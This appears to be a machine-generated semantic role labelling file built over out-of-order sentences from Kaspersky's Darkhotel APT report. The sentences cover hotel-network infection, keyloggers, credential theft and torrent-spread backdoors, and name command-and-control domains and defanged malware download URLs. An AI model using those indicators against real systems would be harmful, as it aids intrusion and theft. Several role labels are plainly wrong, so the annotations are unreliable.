"ARG1": {"text": "Darkhotel campaigns involving typical spear - phished Tapaoux implants publicly appeared in bits and pieces several times over the past five years"}}, "involving": {"ARG2": {"text": "Darkhotel campaigns"}, "V": {"text": "involving", "index": 11}, "ARG1": {"text": "typical spear - phished Tapaoux implants"}}, "phished": {"V": {"text": "phished", "index": 15}, "ARG1": {"text": "Tapaoux"}}, "appeared": {"ARG1": {"text": "Darkhotel campaigns involving typical spear - phished Tapaoux implants"}, "ARGM-MNR": {"text": "publicly"}, "V": {"text": "appeared", "index": 19}, "ARGM-LOC": {"text": "in bits and pieces"}, "ARGM-TMP": {"text": "several times/ over the past five years"}}}, " In\nthe past few years, they deployed 0-day spear-phishing attacks targeting Adobe\nproducts and Microsoft Internet Explorer, including cve\u00ad2010\u00ad0188": {"deployed": {"ARGM-TMP": {"text": "In the past few years"}, "ARG0": {"text": "they"}, "V": {"text": "deployed", "index": 7}, "ARG1": {"text": "0-day spear - phishing attacks targeting Adobe products and Microsoft Internet Explorer , including cve\u00ad2010\u00ad0188"}}, "phishing": {"V": {"text": "phishing", "index": 11}, "ARG1": {"text": "attacks"}}, "targeting": {"ARG0": {"text": "spear - phishing attacks"}, "V": {"text": "targeting", "index": 13}, "ARG1": {"text": "Adobe products and Microsoft Internet Explorer , including cve\u00ad2010\u00ad0188"}}, "including": {"ARG2": {"text": "Adobe products and Microsoft Internet Explorer"}, "V": {"text": "including", "index": 21}, "ARG1": {"text": "cve\u00ad2010\u00ad0188"}}}, "\n                               sha1/RSA (2048bits)\n</table>\n</section>\n\n<footer>\nTLP: Green\t                    For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f                                                                                   \n<header>13</header>\n\n<section>\n<heading>Enhanced Keyloggers and Development</heading>\nOne of the most interesting components that we discovered as a part of this cam-\npaign was the use of a digitally\u00adsigned advanced keylogger": {"discovered": {"ARG1": {"text": "the most interesting components"}, "R-ARG1": {"text": "that"}, "ARG0": {"text": "we"}, "V": {"text": "discovered", "index": 12}, "ARG3": {"text": "as a part of this cam- paign"}}, "was": {"ARG1": {"text": "sha1/RSA ( 2048bits ) One of the most interesting components that we discovered as a part of this cam- paign"}, "V": {"text": "was", "index": 20}, "ARG2": {"text": "the use of a digitally\u00adsigned advanced keylogger"}}}, " It is slightly surprising that no rootkit functionality\nhides this service:\n\n<figure></figure>\n\n\nWhen loaded, the NDISKPRO.SYS driver hooks both INT 0x01 and INT 0xff, and\nretrieves keystroke data directly from port 0x60, the motherboard keyboard con-\ntroller itself": {"is": {"V": {"text": "is", "index": 1}, "ARG2": {"text": "slightly surprising"}, "ARG1": {"text": "that no rootkit functionality hides this service : When loaded , the NDISKPRO.SYS driver hooks both INT 0x01 and INT 0xff , and retrieves keystroke data directly from port 0x60 , the motherboard keyboard con- troller itself"}}, "hides": {"ARG0": {"text": "no rootkit functionality"}, "V": {"text": "hides", "index": 8}, "ARG1": {"text": "this service"}}, "loaded": {"ARGM-TMP": {"text": "When"}, "V": {"text": "loaded", "index": 13}}, "keystroke": {"ARG0": {"text": "retrieves"}, "V": {"text": "keystroke", "index": 28}, "ARG1": {"text": "data"}, "ARGM-MNR": {"text": "directly"}, "ARG2": {"text": "from"}, "ARGM-CAU": {"text": "port 0x60"}}}, " In a recent case, word docs embed-\nded with 0-day flash swf files either dropped these backdoors or downloaded and\nexecuted backdoors from remote web servers": {"ded": {"ARGM-LOC": {"text": "In a recent case"}, "ARG1": {"text": "word docs embed-"}, "V": {"text": "ded", "index": 8}, "ARG2": {"text": "with 0-day flash swf files"}}, "dropped": {"ARGM-LOC": {"text": "In a recent case"}, "ARG0": {"text": "word docs embed-"}, "V": {"text": "dropped", "index": 15}, "ARG1": {"text": "these"}, "ARG4": {"text": "backdoors or downloaded"}}, "downloaded": {"ARG0": {"text": "word docs embed-"}, "V": {"text": "downloaded", "index": 19}, "ARGM-DIR": {"text": "from remote web servers"}}, "executed": {"ARG0": {"text": "word docs embed-"}, "V": {"text": "executed", "index": 21}, "ARGM-DIR": {"text": "backdoors/ from remote web servers"}}}, "\n<list>\n\u201ctorrent\\[hgd\u8d44\u6e90\u7ec4][\u6f2b\u753b]comic1\u26067\u6f2b\u753b\u5408\u96c6\u2462+\u2463+\u2464+\u7279\u5178[5.08g][\u7ec5\u58eb\n\u5411][\u603b\u7b2c\u56db\u5341\u4e09\u5f39]\uff08\u4e03\u5915\u8282\u5feb\u4e50\uff01\uff09\\\u6c49\u5316\\(comic1\u26067) [\u8389\u96f6 (\u5c0f\u9e7f\u308a\u306a, \u53e4\n\u4ee3\u5175\u5668)] \u51cc \u00adshinogi\u00ad(\u95ea\u4e71\u30ab\u30b0\u30e9) [\u4e2d\u6587] \u201c\nand\n\u201c\u52d5\u6f2b\\[hgd\u8d44\u6e90\u7ec4][\u6f2b\u753b]comic1\u26067\u6f2b\u753b\u5408\u96c6\u2462+\u2463+\u2464+\u7279\u5178[5.08g][\u7ec5\u58eb\u5411][\n\u603b\u7b2c\u56db\u5341\u4e09\u5f39]\uff08\u4e03\u5915\u8282\u5feb\u4e50\uff01\uff09\\\u6c49\u5316\u201d)\n</list>\nThe associated Darkhotel backdoor was hosted on bittorrent, emule, etc, under\na variety of comic names": {"was": {"V": {"text": "was", "index": 4}}, "hosted": {"ARG1": {"text": "The associated Darkhotel backdoor"}, "V": {"text": "hosted", "index": 5}, "ARGM-ADV": {"text": "on bittorrent , emule"}, "ARGM-DIS": {"text": "etc"}, "ARGM-LOC": {"text": "under a variety of comic names"}}}, "\n<list>\n\u2022\t small downloader\n\u2022\t information stealer\n\u2022\t Trojan\n\u2022\t dropper and self\u00adinjector\n\u2022\t selective infector\n</list>\nThe most interesting behaviors of these components include\n<list>\n\u2022\t highly unusual conditional 180 day command and control communications\n   delay\n\u2022\t self\u00adkill routines when the system default codepage is set to Korean\n\u2022\t enhanced Microsoft IntelliForm authentication theft handling\n\u2022\t infostealer module Internet Explorer, Firefox, and Chrome support\n\u2022\t campaign or stage ID maintenance\n\u2022\t virtual machine execution sensitivity\n\u2022\t selective viral infection routines to focus the spread of malware within organi-\n   zations\n\u2022\t signed malcode (previously noted)\n</list>\n</section>\n\n<section>\n<heading>Small Downloader</heading>\nThis module is quite small (27Kb) and comes as a part of WinRar SFX file that drops\nand starts the module from %APPDATA%\\Microsoft\\Crypto\\DES64v7\\msieckc.exe": {"is": {"ARG1": {"text": "This module"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "quite small ( 27Kb )"}}, "comes": {"ARG1": {"text": "This module"}, "V": {"text": "comes", "index": 9}, "ARGM-PRD": {"text": "as a part of WinRar SFX file that drops and starts the module from % APPDATA%\\Microsoft\\Crypto\\DES64v7\\msieckc.exe"}}, "drops": {"ARG0": {"text": "WinRar SFX file"}, "R-ARG0": {"text": "that"}, "V": {"text": "drops", "index": 18}}, "starts": {"ARG0": {"text": "WinRar SFX file"}, "R-ARG0": {"text": "that"}, "V": {"text": "starts", "index": 20}, "ARG1": {"text": "the module from % APPDATA%\\Microsoft\\Crypto\\DES64v7\\msieckc.exe"}}}, " The main purpose of the module is to collect various secrets stored on a lo-\ncal system and upload them to Darkhotel command and control servers:\n<list>\n\u2022\t   Cached passwords from Internet Explorer 6/7/8/9 (Windows Protected Storage)\n\u2022\t   Mozilla Firefox stored secrets (<12.0)\n\u2022\t   Chrome stored secrets\n\u2022\t   Gmail Notifier credentials\n\u2022\t   Intelliform\u00adhandled data and credentials:\n     \u25e6\u25e6 Twitter\n     \u25e6\u25e6 Facebook\n     \u25e6\u25e6 Yandex\n     \u25e6\u25e6 Qip\n     \u25e6\u25e6 Nifty\n     \u25e6\u25e6 Mail.ru\n     \u25e6\u25e6 126.com email\n     \u25e6\u25e6 Zapak\n     \u25e6\u25e6 Lavabit (encrypted email service now shut down)\n     \u25e6\u25e6 Bigstring\n     \u25e6\u25e6 Gmx\n     \u25e6\u25e6 Sohu\n     \u25e6\u25e6 Zoho\n     \u25e6\u25e6 Sina\n     \u25e6\u25e6 Care2\n     \u25e6\u25e6 Mail.com\n\n<footer>\nTLP: Green\t                For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f                                                                                  \n<header>17</header>\n\n\n   \u25e6\u25e6 Fastmail\n   \u25e6\u25e6 Inbox\n   \u25e6\u25e6 Gawab (middle\u00adeastern email service)\n   \u25e6\u25e6 163.com\n   \u25e6\u25e6 Lycos\n   \u25e6\u25e6 Lycos mail\n   \u25e6\u25e6 Aol login\n   \u25e6\u25e6 Yahoo! logins\n   \u25e6\u25e6 Yahoo! Japan logins\n   \u25e6\u25e6 Microsoft Live logins\n   \u25e6\u25e6 Google login credentials\n</list>\nThis module is designed to terminate itself on Windows with the system de-\nfault codepage set to Korean": {"is": {"ARG1": {"text": "The main purpose of the module"}, "V": {"text": "is", "index": 6}, "ARG2": {"text": "to collect various secrets stored on a lo- cal system and upload them to Darkhotel command and control servers"}}, "collect": {"V": {"text": "collect", "index": 8}, "ARG1": {"text": "various secrets stored on a lo- cal system"}}, "stored": {"ARG1": {"text": "various secrets"}, "V": {"text": "stored", "index": 11}, "ARGM-LOC": {"text": "on a lo- cal system"}}, "upload": {"V": {"text": "upload", "index": 18}, "ARG1": {"text": "them"}, "ARG2": {"text": "to Darkhotel command and control servers"}}, "is_2": {"V": {"text": "is", "index": 29}}, "designed": {"ARG1": {"text": "This module"}, "V": {"text": "designed", "index": 30}, "ARG3": {"text": "to terminate itself on Windows with the system de- fault codepage set to Korean"}}, "terminate": {"ARG0": {"text": "This module"}, "V": {"text": "terminate", "index": 32}, "ARG1": {"text": "itself"}, "ARGM-LOC": {"text": "on Windows with the system de- fault codepage set to Korean"}}, "set": {"ARG1": {"text": "the system de- fault codepage"}, "V": {"text": "set", "index": 42}, "ARG2": {"text": "to Korean"}}}, " It mim-\nics a GUI desktop application but it does not create any visible windows or dialogs\nto interact with local users": {"mim-": {"ARG0": {"text": "It"}, "V": {"text": "mim-", "index": 1}, "ARG1": {"text": "ics/ a GUI desktop application"}}, "does": {"V": {"text": "does", "index": 9}}, "create": {"ARG0": {"text": "it"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "create", "index": 11}, "ARG1": {"text": "any visible windows or dialogs"}, "ARGM-PRP": {"text": "to interact with local users"}}, "interact": {"V": {"text": "interact", "index": 18}, "ARG1": {"text": "with local users"}}}, "\nWhen a user downloads the torrent and decrypts the zip files, the trojan surrepti-\ntiously is installed and run on the victim system": {"downloads": {"ARGM-TMP": {"text": "When"}, "ARG0": {"text": "a user"}, "V": {"text": "downloads", "index": 3}, "ARG1": {"text": "the torrent"}}, "decrypts": {"ARGM-TMP": {"text": "When"}, "ARG0": {"text": "a user"}, "V": {"text": "decrypts", "index": 7}, "ARG1": {"text": "the zip files"}}, "is": {"ARGM-TMP": {"text": "When a user downloads the torrent and decrypts the zip files"}, "ARG1": {"text": "the trojan surrepti-"}, "ARGM-MNR": {"text": "tiously"}, "V": {"text": "is", "index": 16}, "ARG2": {"text": "installed"}}, "installed": {"ARGM-TMP": {"text": "When a user downloads the torrent and decrypts the zip files"}, "ARG1": {"text": "the trojan surrepti-"}, "ARGM-MNR": {"text": "tiously"}, "V": {"text": "installed", "index": 17}}, "run": {"ARGM-TMP": {"text": "When a user downloads the torrent and decrypts the zip files"}, "ARG0": {"text": "the trojan"}, "ARGM-MNR": {"text": "surrepti-/ tiously"}, "V": {"text": "run", "index": 19}, "ARG1": {"text": "on the victim system"}}}, " The attackers successfully de-\nleted traces of their work from earlier attacks in another hotel, but their offensive\ntechniques were the same": {"de-": {"ARG1": {"text": "The attackers"}, "ARGM-MNR": {"text": "successfully"}, "V": {"text": "de-", "index": 3}}, "leted": {"ARG0": {"text": "The attackers"}, "ARGM-MNR": {"text": "successfully"}, "V": {"text": "leted", "index": 4}, "ARG1": {"text": "traces of their work from earlier attacks in another hotel"}}, "were": {"ARG1": {"text": "their offensive techniques"}, "V": {"text": "were", "index": 20}, "ARG2": {"text": "the same"}}}, " This spear-phishing activity continues into\n2014": {"phishing": {"ARGM-LOC": {"text": "spear"}, "V": {"text": "phishing", "index": 3}, "ARG0": {"text": "activity"}}, "continues": {"ARG1": {"text": "This spear - phishing activity"}, "V": {"text": "continues", "index": 5}, "ARGM-TMP": {"text": "into 2014"}}}, " But the\nattackers also maintain truly precise targeting information over the victim\u2019s visit,\nmuch like they would know a victim\u2019s email address and content interests in a\nspearphishing attack": {"maintain": {"ARGM-DIS": {"text": "But"}, "ARG0": {"text": "the attackers"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "maintain", "index": 4}, "ARG1": {"text": "truly precise targeting information over the victim \u2019s visit , much like they would know a victim \u2019s email address and content interests in a spearphishing attack"}}, "targeting": {"ARG0": {"text": "truly precise"}, "V": {"text": "targeting", "index": 7}, "ARG1": {"text": "information over the victim \u2019s visit"}}, "would": {"ARGM-MOD": {"text": "would"}}, "know": {"ARG0": {"text": "they"}, "ARGM-MOD": {"text": "would"}, "V": {"text": "know", "index": 19}, "ARG1": {"text": "a victim \u2019s email address and content interests in a spearphishing attack"}}}, "\n</section>\n\n\n<footer>\nTLP: Green\t                  For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f\n<header>24</header>\n\n<section>\n<heading>C2 Communications and Structure</heading>\nTypical main page:\n\n<figure></figure>\n\n\nFor begatrendstone.com, we have the following directory structure:\n<list>\n/bin\n   \u00adread_i.php (main C&C script)\n    \u00adlogin.php (unknown, replies \u201cWrong ID()\u201d)\n/bin/error (error logs stored here)\n     \u00adddrlog\n/bin/tmp\n/bin/SElhxxwiN3pxxiAPxxc9\n      -all.gif\n      /i\n      - encrypted stolen victim system content\n      /L\n      /f\nFor auto2116.phpnet.us, we have the following directory structure:\n/patch\n   \u00adchkupdate.php (main command and control script)\n/patch/error\n    \u00adddrlog\n</list>\nThe group encrypts victim data on their servers with single user/passkey combi-\nnations across multiple victims": {"encrypts": {"ARG0": {"text": "The group"}, "V": {"text": "encrypts", "index": 2}, "ARG1": {"text": "victim data"}, "ARGM-MNR": {"text": "with single user"}}}, "\nCatch.exe, detected as Backdoor.Win32.Agent.dgrn, communicates with the fol-\nlowing Darkhotel command and control servers:\n<list>\nmicrodelta.crabdance.com\nmicroyours.ignorelist.com\nmicronames.jumpingcrab.com\nmicrochisk.mooo.com\nmicroalba.serveftp.com\n</list>\n\n<footer>\nTLP: Green\t                  For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f\n<header>8</header>\n\n\nOther examples of this Darkhotel backdoor bound within a shared torrent include\nadult content Japanese anime and more": {"detected": {"ARG1": {"text": "Catch.exe"}, "V": {"text": "detected", "index": 2}, "ARGM-ADV": {"text": "as Backdoor/ Win32.Agent.dgrn"}}, "lowing": {"ARG0": {"text": "the fol-"}, "V": {"text": "lowing", "index": 12}, "ARG1": {"text": "Darkhotel command and control servers"}}, "bound": {"ARG1": {"text": "Other examples of this Darkhotel backdoor"}, "V": {"text": "bound", "index": 25}, "ARGM-LOC": {"text": "within a shared torrent"}}, "shared": {"V": {"text": "shared", "index": 28}, "ARG1": {"text": "torrent"}}, "include": {"ARG2": {"text": "Other examples of this Darkhotel backdoor bound within a shared torrent"}, "V": {"text": "include", "index": 30}, "ARG1": {"text": "adult content Japanese anime and more"}}}, " It was built as MFC framework application with a\nlot of extra calls that should have complicated the analysis of the sample": {"was": {"V": {"text": "was", "index": 1}}, "built": {"ARG1": {"text": "It"}, "V": {"text": "built", "index": 2}, "ARGM-PRD": {"text": "as MFC framework application"}, "ARG2": {"text": "with a lot of extra calls that should have complicated the analysis of the sample"}}, "should": {"V": {"text": "should", "index": 14}}, "have": {"R-ARG0": {"text": "that"}, "ARGM-MOD": {"text": "should"}, "V": {"text": "have", "index": 15}, "ARG1": {"text": "the"}}, "complicated": {"ARG0": {"text": "a lot of extra calls"}, "R-ARG0": {"text": "that"}, "ARGM-MOD": {"text": "should"}, "V": {"text": "complicated", "index": 16}, "ARG1": {"text": "the analysis of the sample"}}}, " But what looks like the AxDecrypt.exe decryptor is bound to\nboth the true decryptor and the dropper for the Darkhotel Catch.exe Karba Trojan": {"looks": {"ARG0": {"text": "what"}, "V": {"text": "looks", "index": 2}, "ARG1": {"text": "like the AxDecrypt.exe decryptor"}}, "is": {"ARGM-DIS": {"text": "But"}, "V": {"text": "is", "index": 7}, "ARG2": {"text": "bound to both the true decryptor and the dropper for the Darkhotel Catch.exe Karba Trojan"}}, "bound": {"ARGM-DIS": {"text": "But"}, "V": {"text": "bound", "index": 8}, "ARG1": {"text": "to both the true decryptor and the dropper for the Darkhotel Catch.exe Karba Trojan"}}}, " This file is located\nin the same directory as the original dropper, which maintains persistence across\nreboots with a simple addition to the HKCU run key": {"is": {"V": {"text": "is", "index": 2}}, "located": {"ARG1": {"text": "This file"}, "V": {"text": "located", "index": 3}, "ARGM-LOC": {"text": "in the same directory"}, "ARGM-PRD": {"text": "as the original dropper , which maintains persistence across reboots with a simple addition to the HKCU run key"}}, "maintains": {"ARG0": {"text": "the original dropper"}, "R-ARG0": {"text": "which"}, "V": {"text": "maintains", "index": 14}, "ARG1": {"text": "persistence across reboots with a simple addition to the HKCU run key"}}, "run": {"ARG1": {"text": "a simple addition to the HKCU"}, "V": {"text": "run", "index": 25}, "ARG2": {"text": "key"}}}, " This is becoming more and more common on the APT scene,\nwhere targeted attacks are used to compromise high profile victims and botnet\nstyle operations are used for massive surveillance or performing other tasks such\nas launching DDoS attacks on hostile parties or simply upgrading victims to more\nsophisticated espionage tools": {"is": {"V": {"text": "is", "index": 1}}, "becoming": {"ARG1": {"text": "This"}, "V": {"text": "becoming", "index": 2}, "ARG2": {"text": "more and more common on the APT scene , where targeted attacks are used to compromise high profile victims and botnet style operations are used for massive surveillance or performing other tasks such as launching DDoS attacks on hostile parties or simply upgrading victims to more sophisticated espionage tools"}}, "targeted": {"V": {"text": "targeted", "index": 13}, "ARG1": {"text": "attacks"}}, "are": {"V": {"text": "are", "index": 15}}, "used": {"ARG1": {"text": "targeted attacks"}, "V": {"text": "used", "index": 16}, "ARG2": {"text": "to compromise high profile victims and botnet style operations"}}, "compromise": {"V": {"text": "compromise", "index": 18}, "ARG1": {"text": "high profile victims and botnet style operations"}}, "are_2": {"V": {"text": "are", "index": 26}}, "used_2": {"ARG1": {"text": "botnet style operations"}, "V": {"text": "used", "index": 27}, "ARG2": {"text": "for massive surveillance"}}, "performing": {"V": {"text": "performing", "index": 32}, "ARG1": {"text": "other tasks such as launching DDoS attacks on hostile parties or simply upgrading victims to more sophisticated espionage tools"}}, "launching": {"V": {"text": "launching", "index": 37}, "ARG1": {"text": "DDoS attacks on hostile parties or simply upgrading victims"}}, "upgrading": {"ARGM-ADV": {"text": "simply"}, "V": {"text": "upgrading", "index": 45}, "ARG1": {"text": "victims"}}}, " As soon as their target\u2019s stay was over and\nthe attack-frame was closed, the attackers deleted their iframe placement and\nbackdoored executables from the hotel network": {"was": {"ARG1": {"text": "their target \u2019s stay"}, "V": {"text": "was", "index": 7}, "ARG2": {"text": "over"}}, "was_2": {"ARG1": {"text": "the attack - frame"}, "V": {"text": "was", "index": 14}, "ARG2": {"text": "closed"}}, "closed": {"ARG1": {"text": "the attack - frame"}, "V": {"text": "closed", "index": 15}}, "deleted": {"ARGM-TMP": {"text": "As soon as their target \u2019s stay was over and the attack - frame was closed"}, "ARG0": {"text": "the attackers"}, "V": {"text": "deleted", "index": 19}, "ARG1": {"text": "their iframe placement"}}, "backdoored": {"ARGM-TMP": {"text": "As soon as their target \u2019s stay was over and the attack - frame was closed"}, "ARG0": {"text": "the attackers"}, "V": {"text": "backdoored", "index": 24}, "ARG1": {"text": "executables from the hotel network"}}}, " The Trojan collects data about the system and anti\u00ad\nmalware software installed on it, and uploads that data to Darkhotel command\nand control servers": {"collects": {"ARG0": {"text": "The Trojan"}, "V": {"text": "collects", "index": 2}, "ARG2": {"text": "data"}, "ARG1": {"text": "about the system"}}, "installed": {"ARG1": {"text": "malware software"}, "V": {"text": "installed", "index": 11}, "ARG2": {"text": "on it"}}, "uploads": {"ARG0": {"text": "The Trojan"}, "V": {"text": "uploads", "index": 16}, "ARG1": {"text": "that data to Darkhotel command and control servers"}}}, "\n\n<figure></figure>\n</section>\n<footer>\nTLP: Green\t                For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f\n<header>22</header>\n\n<section>\n<heading>Sinkhole Data</heading>\nBecause the operators very actively build up new command and control serv-\ners, it is difficult to sinkhole enough domains to get an accurate overall picture\nof victim system location based on this data": {"build": {"ARG0": {"text": "the operators"}, "ARGM-MNR": {"text": "very actively"}, "V": {"text": "build", "index": 5}, "ARG1": {"text": "new command and control serv- ers"}}, "is": {"ARGM-CAU": {"text": "Because the operators very actively build up new command and control serv- ers"}, "V": {"text": "is", "index": 15}, "ARG2": {"text": "difficult"}, "ARG1": {"text": "to sinkhole enough domains to get an accurate overall picture of victim system location based on this data"}}, "sinkhole": {"V": {"text": "sinkhole", "index": 18}, "ARG1": {"text": "enough domains"}, "ARGM-PRP": {"text": "to"}, "ARGM-PNC": {"text": "get an accurate overall picture of victim system location based on this data"}}, "get": {"V": {"text": "get", "index": 22}, "ARG1": {"text": "an accurate overall picture of victim system location based on this data"}}, "based": {"ARG1": {"text": "an accurate overall picture of victim system location"}, "V": {"text": "based", "index": 31}, "ARG2": {"text": "on this data"}}}, " The attacks follow the typical spear-phishing process and in the past couple of\nmonths, exploited systems retrieved downloader executables from web servers like\n<list>\nhxxp://office\u00adrevision.com/update/files22/update.exe or hxxp://trade\u00adinf.com/mt/\nduspr.exe\n</list>\nOver the past few years the group has emailed links that redirect targets\u2019 brows-\ners to Internet Explorer 0-day exploits": {"follow": {"ARG1": {"text": "The attacks"}, "V": {"text": "follow", "index": 2}, "ARG2": {"text": "the typical spear - phishing process"}}, "phishing": {"ARGM-MNR": {"text": "spear"}, "V": {"text": "phishing", "index": 7}, "ARG1": {"text": "process"}}, "exploited": {"V": {"text": "exploited", "index": 17}, "ARG1": {"text": "systems retrieved downloader executables"}, "ARG2": {"text": "from web servers like Over the past few years"}}, "retrieved": {"ARG0": {"text": "exploited systems"}, "V": {"text": "retrieved", "index": 19}, "ARG1": {"text": "downloader executables"}, "ARG2": {"text": "from web servers"}, "ARGM-MNR": {"text": "like"}, "ARGM-TMP": {"text": "Over the past few years"}}, "has": {"V": {"text": "has", "index": 33}}, "emailed": {"ARGM-TMP": {"text": "in the past couple of months"}, "ARG0": {"text": "the group"}, "V": {"text": "emailed", "index": 34}, "ARG1": {"text": "links that redirect targets \u2019 brows- ers to Internet Explorer 0-day exploits"}}, "redirect": {"ARG0": {"text": "emailed links"}, "R-ARG0": {"text": "that"}, "V": {"text": "redirect", "index": 37}, "ARG1": {"text": "targets \u2019 brows- ers"}, "ARGM-PRP": {"text": "to Internet Explorer 0-day exploits"}}}, " These tools are dropped by hotel installers spoofing legiti-\nmate software installers, bound within torrent bundles, or dropped by exploits or\nhypertext linked from spear-phishing emails": {"are": {"V": {"text": "are", "index": 2}}, "dropped": {"ARG1": {"text": "These tools"}, "V": {"text": "dropped", "index": 3}, "ARG0": {"text": "by hotel installers spoofing legiti- mate software installers , bound within torrent bundles ,"}}, "spoofing": {"ARG0": {"text": "hotel installers"}, "V": {"text": "spoofing", "index": 7}, "ARG1": {"text": "legiti- mate software installers , bound within torrent bundles"}}, "bound": {"V": {"text": "bound", "index": 13}, "ARG1": {"text": "within torrent bundles"}}, "dropped_2": {"ARG1": {"text": "These tools"}, "V": {"text": "dropped", "index": 19}, "ARG2": {"text": "by exploits or hypertext linked from spear - phishing emails"}}, "linked": {"ARG1": {"text": "hypertext"}, "V": {"text": "linked", "index": 24}, "ARGM-ADV": {"text": "from spear - phishing emails"}}, "phishing": {"V": {"text": "phishing", "index": 28}, "ARG1": {"text": "emails"}}}, "\nThe following list presents a set of characteristics for the crew:\n<list>\n\u2022\t operational competence to compromise, mis-use, and maintain access to\n   global scale, trusted commercial network resources with strategic precision\n   for years\n\u2022\t advanced mathematical and crypto-analytical offensive capabilities, along\n   with no regard for undermining the trust extended to the Certificate Authorities\n   and the PKI\n\u2022\t indiscriminately infect systems with some regional clarity over trusted and\n   untrusted resources to build and operate large botnets\n\u2022\t well-developed low level keyloggers within an effective and consistent toolset\n\u2022\t a focus throughout campaigns on specific victim categories and tagging them\n\u2022\t a larger, dynamic infrastructure built of apache webservers, dynamic dns\n   records, crypto libraries, and php webapps\n\u2022\t regular 0-day access - recent deployment of an embedded Adobe Flash 0-day\n   spear-phishing exploit, and infrequent deployment of other 0-day resources to\n   sustain larger campaigns over several years\n</list>\n<figure></figure>\n</section>\n<footer>\nTLP: Green\t               For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f\n<header>4</header>\n\n<section>\n<heading>Introduction</heading>\nWhen unsuspecting guests, including situationally aware corporate executives and\nhigh-tech entrepreneurs, travel to a variety of hotels and connect to the internet,\nthey are infected with a rare APT Trojan posing as any one of several major software\nreleases": {"presents": {"ARG0": {"text": "The following list"}, "V": {"text": "presents", "index": 3}, "ARG1": {"text": "a set of characteristics for the crew"}}, "including": {"ARGM-TMP": {"text": "When"}, "ARG2": {"text": "unsuspecting guests"}, "V": {"text": "including", "index": 16}, "ARG1": {"text": "situationally aware corporate executives and high - tech entrepreneurs , travel to a variety of hotels and connect to the internet"}}, "travel": {"ARGM-TMP": {"text": "When"}, "ARG0": {"text": "unsuspecting guests , including situationally aware corporate executives and high - tech entrepreneurs"}, "V": {"text": "travel", "index": 27}, "ARG1": {"text": "to a variety of hotels"}}, "connect": {"ARGM-TMP": {"text": "When"}, "V": {"text": "connect", "index": 34}, "ARG1": {"text": "to the internet"}}, "are": {"V": {"text": "are", "index": 40}}, "infected": {"ARGM-TMP": {"text": "When unsuspecting guests , including situationally aware corporate executives and high - tech entrepreneurs , travel to a variety of hotels and connect to the internet"}, "ARG1": {"text": "they"}, "V": {"text": "infected", "index": 41}, "ARG2": {"text": "with a rare APT Trojan posing as any one of several major software releases"}}, "posing": {"ARG0": {"text": "a rare APT Trojan"}, "V": {"text": "posing", "index": 47}, "ARG1": {"text": "as any one of several major software releases"}}}, "\nDuring its infection routine, the infector changes the entrypoint of executable\nfiles, creates an .rdat section, and inserts a small loader in the section, then puts\nits main payload in the overlay": {"changes": {"ARGM-TMP": {"text": "During"}, "ARG0": {"text": "the infector"}, "V": {"text": "changes", "index": 7}, "ARG1": {"text": "the entrypoint of executable files"}}, "creates": {"ARGM-TMP": {"text": "During its infection routine"}, "ARG0": {"text": "the infector changes the entrypoint of executable files"}, "V": {"text": "creates", "index": 14}, "ARG1": {"text": "an .rdat section"}}, "inserts": {"ARGM-TMP": {"text": "During its infection routine"}, "ARG0": {"text": "the infector changes the entrypoint of executable"}, "V": {"text": "inserts", "index": 20}, "ARG1": {"text": "a small loader"}, "ARGM-LOC": {"text": "in the section"}}, "puts": {"ARGM-TMP": {"text": "During its infection routine/ then"}, "ARG0": {"text": "the infector changes the entrypoint of executable files"}, "V": {"text": "puts", "index": 29}, "ARG1": {"text": "its main payload"}, "ARG2": {"text": "in the overlay"}}}, " Digitally signed Darkhotel\nbackdoors were installed alongside the legitimate packages": {"signed": {"ARG1": {"text": "Digitally"}, "V": {"text": "signed", "index": 1}, "ARG2": {"text": "Darkhotel"}}, "were": {"V": {"text": "were", "index": 4}}, "installed": {"ARG1": {"text": "signed Darkhotel backdoors"}, "V": {"text": "installed", "index": 5}, "ARG2": {"text": "alongside the legitimate packages"}}}, "\n</section>\n\n\n<footer>\nTLP: Green\t               For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f\n<header>18</header>\n\n<section>\n<heading>Selective Infector</heading>\nThis component is a virus, and is used to selectively infiltrate into other comput-\ners via USB or network shares": {"is": {"ARG1": {"text": "This component"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "a virus"}}, "is_2": {"V": {"text": "is", "index": 7}}, "used": {"ARG1": {"text": "This component"}, "V": {"text": "used", "index": 8}, "ARG2": {"text": "to selectively infiltrate into other comput- ers"}, "ARGM-MNR": {"text": "via USB or network shares"}}, "infiltrate": {"ARG0": {"text": "This component"}, "ARGM-MNR": {"text": "selectively/ via USB or network shares"}, "V": {"text": "infiltrate", "index": 11}, "ARG1": {"text": "into other comput- ers"}}}, " The archive\nis also spread over bittorrent, as detailed below": {"is": {"V": {"text": "is", "index": 2}}, "spread": {"ARG1": {"text": "The archive"}, "ARGM-ADV": {"text": "also/ over bittorrent/ as detailed below"}, "V": {"text": "spread", "index": 4}}, "detailed": {"V": {"text": "detailed", "index": 9}, "ARGM-LOC": {"text": "below"}}}, " It\u2019s interesting that the Flash objects were\nembedded in Korean documents titled \u201cList of the latest Japanese AV wind and\nhow to use torrents.docx\u201d (loose English translation)": {"\u2019s": {"V": {"text": "\u2019s", "index": 1}, "ARG2": {"text": "interesting"}, "ARG1": {"text": "that the Flash objects were embedded in Korean documents titled \u201c List of the latest Japanese AV wind and how to use torrents.docx \u201d ( loose English translation )"}}, "were": {"V": {"text": "were", "index": 7}}, "embedded": {"ARG1": {"text": "the Flash objects"}, "V": {"text": "embedded", "index": 8}, "ARG2": {"text": "in Korean documents titled \u201c List of the latest Japanese AV wind and how to use torrents.docx \u201d ( loose English translation )"}}, "titled": {"ARG1": {"text": "Korean documents"}, "V": {"text": "titled", "index": 12}, "ARG2": {"text": "\u201c List of the latest Japanese AV wind"}}, "use": {"ARGM-MNR": {"text": "how"}, "V": {"text": "use", "index": 24}, "ARG1": {"text": "torrents.docx"}}}, "\n</section>\n\n<section>\n<heading>Information Stealer</heading>\nThis module is relatively large (455Kb) and comes as a part of a WinRar SFX file\nthat drops and starts the module from %APPDATA%\\Microsoft\\Display\\DmaUp3": {"is": {"ARG1": {"text": "This module"}, "V": {"text": "is", 